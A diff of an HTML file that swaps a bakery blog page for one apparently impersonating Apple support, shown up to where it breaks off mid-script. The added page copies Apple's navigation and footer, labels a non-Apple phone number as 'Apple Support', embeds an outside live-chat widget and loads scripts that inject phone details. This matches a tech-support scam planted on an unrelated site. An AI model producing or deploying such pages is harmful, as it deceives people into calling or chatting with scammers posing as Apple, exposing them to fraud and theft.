@@ -1,618 +1,384 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kingdom Pastry Orchard · The Art of Fruit & Flour</title>
-  <meta name="description" content="Kingdom Pastry Orchard is an authority blog exploring the harmony of heirloom fruits and refined pastry. Recipes, science, and stories from a wild orchard kitchen.">
-  <!-- Premium typography: serif for soul, sans for structure -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Petrona:ital,wght@0,300;0,500;0,700;1,300&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700&display=swap" rel="stylesheet">
-  <style>
-    /* ----- reset & variables : handcrafted palette ----- */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    :root {
-      --cream: #FDF7F0;
-      --dusk: #2E241E;
-      --russet: #A65A3A;
-      --goldenrod: #D49A4A;
-      --sage: #7E8D7A;
-      --moss: #4F5D4A;
-      --fig: #482E2A;
-      --paper: #F9F3EB;
-      --stone: #E5DDD4;
-      --ink: #1F1916;
-      --accent: #C37B4B;
-      --border-soft: #E3D6CA;
-      --shadow-floating: 0 12px 40px -12px rgba(30, 20, 15, 0.12);
-      --shadow-card: 0 8px 24px -8px rgba(30, 20, 15, 0.08);
-      --radius-petal: 40px 12px 40px 12px;
-      --radius-leaf: 20px 40px 20px 40px;
-      --font-serif: 'Petrona', Georgia, 'Times New Roman', serif;
-      --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-    html {
-      scroll-behavior: smooth;
-    }
-    body {
-      background: var(--cream);
-      color: var(--ink);
-      font-family: var(--font-sans);
-      font-weight: 300;
-      line-height: 1.7;
-      padding: 0 1.2rem;
-    }
-    .container {
-      max-width: 1440px;
-      margin: 0 auto;
-    }
-    a {
-      color: var(--russet);
-      text-decoration: none;
-      transition: all 0.25s;
-    }
-    a:hover {
-      color: var(--fig);
-    }
-    img {
-      max-width: 100%;
-      height: auto;
-      display: block;
-      border-radius: var(--radius-leaf);
-    }
-    h1, h2, h3, h4 {
-      font-family: var(--font-serif);
-      font-weight: 500;
-      letter-spacing: -0.01em;
-      line-height: 1.2;
-    }
-    h2 {
-      font-size: 2.6rem;
-      font-weight: 600;
-      margin-bottom: 0.75rem;
-    }
-    h3 {
-      font-size: 1.8rem;
-      font-weight: 500;
-      margin-top: 2.5rem;
-      margin-bottom: 0.5rem;
-    }
-    /* ----- brand identity: name + logo concept (text based) ----- */
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 0.4rem;
-      font-family: var(--font-serif);
-      font-size: 1.8rem;
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      color: var(--dusk);
-    }
-    .brand-icon {
-      display: inline-block;
-      background: var(--russet);
-      color: var(--cream);
-      width: 48px;
-      height: 48px;
-      border-radius: 60% 40% 60% 40% / 40% 60% 40% 60%;
-      text-align: center;
-      line-height: 48px;
-      font-size: 1.4rem;
-      margin-right: 0.2rem;
-      transform: rotate(-3deg);
-      box-shadow: 0 6px 12px rgba(166, 90, 58, 0.2);
-    }
-    /* ----- navigation: floating, asymmetric, with underline animation ----- */
-    nav {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 1.8rem 0 0.8rem;
-      border-bottom: 1px solid var(--border-soft);
-      flex-wrap: wrap;
-    }
-    .nav-links {
-      display: flex;
-      gap: 2.4rem;
-      font-size: 0.95rem;
-      font-weight: 400;
-      text-transform: uppercase;
-      letter-spacing: 0.08em;
-    }
-    .nav-links a {
-      position: relative;
-      padding: 0.2rem 0;
-      color: var(--dusk);
-    }
-    .nav-links a::after {
-      content: '';
-      position: absolute;
-      bottom: -2px;
-      left: 0;
-      width: 0;
-      height: 1.5px;
-      background: var(--goldenrod);
-      transition: width 0.3s ease;
-    }
-    .nav-links a:hover::after {
-      width: 100%;
-    }
-    .nav-actions {
-      display: flex;
-      gap: 1.5rem;
-      font-size: 0.9rem;
-    }
-    .btn-outline {
-      border: 1px solid var(--dusk);
-      padding: 0.4rem 1.4rem;
-      border-radius: 60px;
-      font-weight: 500;
-      transition: 0.2s;
-    }
-    .btn-outline:hover {
-      background: var(--dusk);
-      color: var(--cream);
-      border-color: var(--dusk);
-    }
-    /* ----- HOMEPAGE: unique “orchard journal” layout (not hero/featured/latest) ----- */
-    /* SECTION 1: “The Orchard Foreword” – a lyrical introduction with split text + image */
-    .foreword {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 3rem;
-      margin: 4rem 0 5rem;
-      align-items: center;
-    }
-    .foreword-text {
-      padding-right: 1rem;
-    }
-    .foreword-text .pre-title {
-      font-size: 0.8rem;
-      letter-spacing: 0.2em;
-      text-transform: uppercase;
-      color: var(--sage);
-      margin-bottom: 0.5rem;
-      font-weight: 600;
-    }
-    .foreword-text h1 {
-      font-size: 3.8rem;
-      font-weight: 600;
-      line-height: 1.1;
-      margin-bottom: 1.5rem;
-      color: var(--dusk);
-    }
-    .foreword-text p {
-      font-size: 1.2rem;
-      color: var(--fig);
-      max-width: 90%;
-      border-left: 4px solid var(--goldenrod);
-      padding-left: 1.5rem;
-    }
-    .foreword-image {
-      background: var(--stone);
-      border-radius: var(--radius-petal);
-      overflow: hidden;
-      box-shadow: var(--shadow-floating);
-      transform: rotate(1deg);
-      transition: transform 0.3s;
-    }
-    .foreword-image:hover {
-      transform: rotate(0deg) scale(1.01);
-    }
-    /* SECTION 2: “Orchard Almanac” – timeline / seasonal posts (not cards) */
-    .almanac {
-      margin: 5rem 0 4rem;
-      position: relative;
-    }
-    .almanac::before {
-      content: '';
-      position: absolute;
-      left: 0;
-      top: 0;
-      bottom: 0;
-      width: 3px;
-      background: var(--goldenrod);
-      opacity: 0.3;
-    }
-    .almanac-item {
-      display: flex;
-      gap: 2.5rem;
-      padding: 2rem 0 2rem 2.5rem;
-      border-bottom: 1px dashed var(--border-soft);
-      align-items: flex-start;
-    }
-    .almanac-date {
-      min-width: 110px;
-      font-family: var(--font-serif);
-      font-size: 1.5rem;
-      font-weight: 500;
-      color: var(--russet);
-      letter-spacing: -0.02em;
-    }
-    .almanac-content h3 {
-      margin-top: 0;
-      font-size: 1.8rem;
-    }
-    .almanac-content p {
-      max-width: 700px;
-      color: var(--fig);
-    }
-    .almanac-tag {
-      display: inline-block;
-      background: var(--sage);
-      color: white;
-      padding: 0.2rem 1rem;
-      border-radius: 40px;
-      font-size: 0.7rem;
-      letter-spacing: 0.06em;
-      text-transform: uppercase;
-      margin-top: 0.5rem;
-    }
-    /* SECTION 3: “Graft & Glaze” – two column knowledge (articles + infographic) */
-    .graft-glaze {
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 2.5rem;
-      margin: 5rem 0;
-      background: var(--paper);
-      padding: 3rem 2.5rem;
-      border-radius: var(--radius-leaf);
-      box-shadow: var(--shadow-card);
-    }
-    .graft-glaze h2 {
-      grid-column: 1 / -1;
-      font-size: 2.2rem;
-      border-bottom: 2px solid var(--goldenrod);
-      padding-bottom: 0.6rem;
-      display: inline-block;
-      width: auto;
-    }
-    .feature-article {
-      background: white;
-      padding: 1.8rem;
-      border-radius: 20px 60px 20px 60px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.02);
-    }
-    .feature-article h3 {
-      margin-top: 0.2rem;
-    }
-    .infographic-box {
-      background: var(--dusk);
-      color: var(--cream);
-      padding: 1.8rem;
-      border-radius: 60px 20px 60px 20px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-    }
-    .infographic-box .stat {
-      font-size: 2.4rem;
-      font-family: var(--font-serif);
-      font-weight: 600;
-      color: var(--goldenrod);
-    }
-    .infographic-box hr {
-      border: 0.5px solid var(--sage);
-      margin: 1rem 0;
-      opacity: 0.3;
-    }
-    /* SECTION 4: “From the Cellar” – floating card style, each different */
-    .cellar {
-      margin: 5rem 0;
-    }
-    .cellar-grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr 1fr;
-      gap: 1.8rem;
-    }
-    .cellar-card {
-      background: white;
-      padding: 1.8rem 1.8rem 2.2rem;
-      border-radius: 50px 12px 50px 12px;
-      box-shadow: var(--shadow-floating);
-      transition: all 0.25s;
-      border: 1px solid var(--border-soft);
-    }
-    .cellar-card:nth-child(2) {
-      border-radius: 12px 50px 12px 50px;
-      background: var(--paper);
-    }
-    .cellar-card:nth-child(3) {
-      border-radius: 30px 30px 8px 30px;
-      background: #FCF7F0;
-    }
-    .cellar-card:hover {
-      transform: translateY(-6px);
-      box-shadow: 0 20px 32px -16px rgba(30,20,15,0.15);
-    }
-    .cellar-card h4 {
-      font-size: 1.5rem;
-      margin-bottom: 0.4rem;
-    }
-    .cellar-meta {
-      font-size: 0.8rem;
-      color: var(--sage);
-      text-transform: uppercase;
-      letter-spacing: 0.04em;
-    }
-    /* ----- BLOG PAGE (simulated) : long-form article with table, FAQ etc ----- */
-    .blog-article {
-      max-width: 880px;
-      margin: 4rem auto;
-      background: white;
-      padding: 3rem 4rem;
-      border-radius: var(--radius-petal);
-      box-shadow: var(--shadow-floating);
-    }
-    .blog-article h1 {
-      font-size: 3.2rem;
-      font-weight: 600;
-    }
-    .blog-article .byline {
-      font-style: italic;
-      color: var(--sage);
-      margin: 0.2rem 0 2rem;
-      border-bottom: 1px solid var(--border-soft);
-      padding-bottom: 1rem;
-    }
-    .blog-article table {
-      width: 100%;
-      border-collapse: collapse;
-      margin: 2rem 0;
-      font-size: 0.95rem;
-    }
-    .blog-article th {
-      background: var(--dusk);
-      color: white;
-      padding: 0.8rem 1rem;
-      text-align: left;
-      font-weight: 500;
-    }
-    .blog-article td {
-      border-bottom: 1px solid var(--border-soft);
-      padding: 0.8rem 1rem;
-    }
-    .blog-article .faq-item {
-      background: var(--paper);
-      padding: 1rem 1.8rem;
-      border-radius: 40px 8px 40px 8px;
-      margin: 1.2rem 0;
-    }
-    /* ----- FOOTER: a unique orchard grid with wild links ----- */
-    footer {
-      margin-top: 5rem;
-      padding: 3rem 0 2rem;
-      border-top: 2px solid var(--stone);
-      display: grid;
-      grid-template-columns: 2fr 1fr 1fr 1fr;
-      gap: 2rem;
-      background: var(--paper);
-      border-radius: 40px 40px 0 0;
-      padding: 3rem 3rem 2rem;
-    }
-    footer .brand {
-      font-size: 1.6rem;
-    }
-    footer .footer-col h5 {
-      font-family: var(--font-sans);
-      text-transform: uppercase;
-      font-weight: 600;
-      font-size: 0.8rem;
-      letter-spacing: 0.1em;
-      color: var(--sage);
-      margin-bottom: 1.2rem;
-    }
-    footer .footer-col a {
-      display: block;
-      margin-bottom: 0.5rem;
-      color: var(--fig);
-      font-weight: 300;
-    }
-    footer .footer-col a:hover {
-      color: var(--russet);
-    }
-    /* ----- responsive touches ----- */
-    @media (max-width: 900px) {
-      .foreword { grid-template-columns: 1fr; }
-      .graft-glaze { grid-template-columns: 1fr; }
-      .cellar-grid { grid-template-columns: 1fr; }
-      footer { grid-template-columns: 1fr 1fr; }
-      .blog-article { padding: 1.5rem; }
-    }
-    @media (max-width: 600px) {
-      .nav-links { gap: 1rem; flex-wrap: wrap; }
-      footer { grid-template-columns: 1fr; }
-    }
-    /* small animations */
-    .fade-up {
-      opacity: 0;
-      animation: fadeUp 0.8s ease forwards;
-    }
-    @keyframes fadeUp {
-      0% { opacity: 0; transform: translateY(14px); }
-      100% { opacity: 1; transform: translateY(0); }
-    }
-    .delay-1 { animation-delay: 0.1s; }
-    .delay-2 { animation-delay: 0.2s; }
-  </style>
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
+
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-i70rd6_Xhib8fTZSYlyl4.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
+
 </head>
+
 <body>
-<div class="container">
-  <!-- navigation -->
-  <nav>
-    <div class="brand">
-      <span class="brand-icon">🌳</span>
-      Kingdom Pastry Orchard
-    </div>
-    <div class="nav-links">
-     <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-					 <li><a href="categories.html">CATEGORIES</a></li>
-					<li><a href="disclamier.html">DISCLAMIER</a></li>
-    </div>
-  </nav>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-  <!-- HOMEPAGE : unique layout -->
-  <section class="foreword fade-up">
-    <div class="foreword-text">
-      <div class="pre-title">🌿 Orchard Journal</div>
-      <h1>Where fruit meets<br>flour & fire</h1>
-      <p>We cultivate heirloom recipes, wild fermentation, and the poetry of pastry. A kingdom of flavor, rooted in the soil.</p>
-    </div>
-    <div class="foreword-image">
-      <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='600' height='400' viewBox='0 0 600 400'%3E%3Crect width='600' height='400' fill='%23E5DDD4'/%3E%3Ccircle cx='200' cy='180' r='60' fill='%23A65A3A' opacity='0.4'/%3E%3Ccircle cx='380' cy='220' r='80' fill='%23D49A4A' opacity='0.3'/%3E%3Cpath d='M120 280 Q250 200 400 300' stroke='%237E8D7A' stroke-width='6' fill='none' opacity='0.3'/%3E%3C/svg%3E" alt="Orchard abstract" style="width:100%;">
-    </div>
-  </section>
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-481-2925 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-  <!-- Almanac timeline -->
-  <section class="almanac fade-up delay-1">
-    <h2 style="margin-bottom: 2rem;">📅 Orchard Almanac</h2>
-    <div class="almanac-item">
-      <div class="almanac-date">June 12</div>
-      <div class="almanac-content">
-        <h3>Stone fruit & sourdough: a love story</h3>
-        <p>How we marry the acidity of plums with the tang of a three-year starter. A deep dive into enzymatic alchemy.</p>
-        <span class="almanac-tag">Baking science</span>
-      </div>
-    </div>
-    <div class="almanac-item">
-      <div class="almanac-date">May 28</div>
-      <div class="almanac-content">
-        <h3>Forgotten apples: 5 heirlooms that redefine tarte tatin</h3>
-        <p>From Ashmead’s Kernel to Esopus Spitzenburg — the varieties that carry depth, tannin, and memory.</p>
-        <span class="almanac-tag">Orchard</span>
-      </div>
-    </div>
-    <div class="almanac-item">
-      <div class="almanac-date">May 9</div>
-      <div class="almanac-content">
-        <h3>Hydration, heat, and honey: the new pastry vernacular</h3>
-        <p>We tested 22 ratios to find the perfect glaze. Spoiler: it’s not about sugar alone.</p>
-        <span class="almanac-tag">Pastry lab</span>
-      </div>
-    </div>
-  </section>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-  <!-- Graft & Glaze: feature article + infographic -->
-  <section class="graft-glaze fade-up delay-2">
-    <h2>🌱 Graft & Glaze</h2>
-    <div class="feature-article">
-      <span style="font-size:0.8rem; text-transform:uppercase; color:var(--sage);">Featured</span>
-      <h3>The Geometry of a Galette</h3>
-      <p>Rustic isn’t random. We break down the physics of free-form pastry, from butter distribution to steam pockets. With a step-by-step guide for the perfect buckwheat-rye crust.</p>
-      <a href="#" style="font-weight:500;">Read the full treatise →</a>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-    <div class="infographic-box">
-      <div class="stat">63%</div>
-      <div>of bakers overwork their dough — we show you how to spot the signs.</div>
-      <hr>
-      <div><span style="font-weight:600;">🥧 4</span> essential folds for laminated fruit pastries.</div>
-      <hr>
-      <div><span style="font-weight:600;">⏳ 18hr</span> minimum rest for optimal gluten relaxation.</div>
-    </div>
-  </section>
 
-  <!-- From the Cellar – floating cards with different styles -->
-  <section class="cellar fade-up">
-    <h2>🧺 From the Cellar</h2>
-    <div class="cellar-grid">
-      <div class="cellar-card">
-        <span class="cellar-meta">Preserves</span>
-        <h4>Quince & black cardamom</h4>
-        <p>A medieval twist with modern technique. Slow-cooked to ruby translucence.</p>
-      </div>
-      <div class="cellar-card">
-        <span class="cellar-meta">Ferments</span>
-        <h4>Lacto-plum syrup</h4>
-        <p>Umami-rich, funky, and utterly transformative in glazes and vinaigrettes.</p>
-      </div>
-      <div class="cellar-card">
-        <span class="cellar-meta">Pastry</span>
-        <h4>Brioche feuilletée</h4>
-        <p>The forgotten cousin of croissant. We detail the lamination that breaks rules.</p>
-      </div>
-    </div>
-  </section>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-2925
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <!-- BLOG ARTICLE (long-form, authority content) -->
-  <article class="blog-article fade-up">
-    <h1>Mastering the Art of the Rustic Tart</h1>
-    <div class="byline">By Margot Rhys · Orchard Scholar · 12 min read</div>
-    <p style="font-size:1.15rem;"><strong>There is a quiet rebellion in the rustic tart.</strong> It defies the rigidity of the fluted mold, the uniformity of the industrial bakery. At Kingdom Pastry Orchard, we’ve spent three seasons studying the marriage of heirloom fruit and hand-rolled dough. This is not a recipe — it’s a philosophy.</p>
-    
-    <h2>The anatomy of a great crust</h2>
-    <p>Most recipes call for “cold butter” and “ice water.” But we’ve learned that the <em>texture</em> of the butter — grated, cubed, or smeared — changes the final bite. In our tests, we found that a mix of grated and pea-sized butter yields a crust that is both flaky and tender. The table below summarises our findings:</p>
-    
-    <table>
-      <thead><tr><th>Technique</th><th>Flakiness</th><th>Ease</th><th>Best for</th></tr></thead>
-      <tbody>
-        <tr><td>Grated butter</td><td>★★★★☆</td><td>★★★☆☆</td><td>Berry tarts</td></tr>
-        <tr><td>Pea-sized cubes</td><td>★★★★★</td><td>★★★★☆</td><td>Stone fruit</td></tr>
-        <tr><td>Combined method</td><td>★★★★★</td><td>★★☆☆☆</td><td>Apples & pears</td></tr>
-      </tbody>
-    </table>
 
-    <h3>Why hydration matters more than fat</h3>
-    <p>We measured dough hydration from 38% to 52%. The sweet spot? 44–46% for most fruit fillings. Above that, the crust becomes tough; below, it crumbles. But the real secret lies in the <strong>rest</strong> — a minimum of 2 hours in the fridge allows the flour to fully absorb the liquid, reducing shrinkage during baking.</p>
 
-    <h3>Common mistakes (and how to avoid them)</h3>
-    <ul style="margin-left:1.5rem; margin-bottom:1.5rem;">
-      <li><strong>Overworking the dough:</strong> Stop when it just comes together. We use a bench scraper to fold it 4–5 times max.</li>
-      <li><strong>Skimping on salt:</strong> Salt amplifies fruit flavour. We use 1.5% salt to flour weight.</li>
-      <li><strong>Blind baking anxiety:</strong> For juicy fruits, we blind-bake the base for 8 minutes at 190°C.</li>
-    </ul>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-    <div class="faq-item">
-      <h4 style="font-family:var(--font-serif);">❓ FAQ: Can I substitute whole wheat flour?</h4>
